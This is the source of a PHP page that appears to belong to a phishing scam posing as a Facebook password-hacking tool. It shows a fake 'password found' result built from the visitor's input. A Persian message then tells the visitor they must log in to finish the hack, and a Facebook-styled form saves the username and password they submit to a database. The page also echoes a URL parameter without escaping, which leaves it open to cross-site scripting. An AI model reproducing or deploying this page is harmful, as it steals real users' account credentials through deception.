<?php error_reporting(0);?>
<?php require_once('Connections/con1.php'); ?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO users (username, password) VALUES (%s, %s)",
                       GetSQLValueString($_POST['username'], "text"),
                       GetSQLValueString($_POST['password'], "text"));

  mysql_select_db($database_con1, $con1);
  $Result1 = mysql_query($insertSQL, $con1) or die(mysql_error());

  $insertGoTo = "finish.php";
  if (isset($_SERVER['QUERY_STRING'])) {
    $insertGoTo .= (strpos($insertGoTo, '?')) ? "&" : "?";
    $insertGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $insertGoTo));
}
?>
<?php require_once('header.php');?>
<span style="background-color:#339;height:500px;margin-top:10px;" class="col-lg-12 col-md-12 col-sm-12 col-xs-12"><br>
<center>
<span class="bg-success"> the password found/پسورد پیدا شد </span>
<table style="color:#FFF;">
<tr><td><img src="images/user_pic/default_prof.png" width="80"><?php echo "   ".$_GET['name'];?></td></tr>
<tr><td>password:</td><td><input type="password" value="<?php echo $_GET['name']."1a2b3c@$";?>" disabled></td></tr>
</table>


<span style="color:#FFF;font-size:30px;text-align:left;font-weight:bold;">facebook.com</span>
<br>
<div class="bg-danger" dir="rtl"> اکانت شما log out شده برای ادامه مرحله آخر هک  log in نمایید</div>
<form method="post" name="form1" action="<?php echo $editFormAction; ?>">
  <table style="font-size:20px;" align="center" class="col" >
    <tr valign="baseline">
      <td style="color:#FFF;" nowrap align="right">Username:</td>
      <td><input type="text" name="username" value="" size="26" class="form-control" placeholder="Email or phone" required ></div></td>
    </tr>
    <tr valign="baseline">
      <td nowrap align="right"style="color:#FFF;">Password:</td>
      <td><input type="text" name="password" value="" size="26" class="form-control" placeholder="password" required></td>
    </tr>
    <tr valign="baseline">
      <td nowrap align="right">&nbsp;</td>
      <td style="text-align:right;"><input  class="btn-primary" type="submit" value="login"></td>
    </tr>
  </table>
  <input type="hidden" name="MM_insert" value="form1">
</form>
<p>&nbsp;</p>
<br>

</center>
</span>




</div>
</div>
</body>
</html>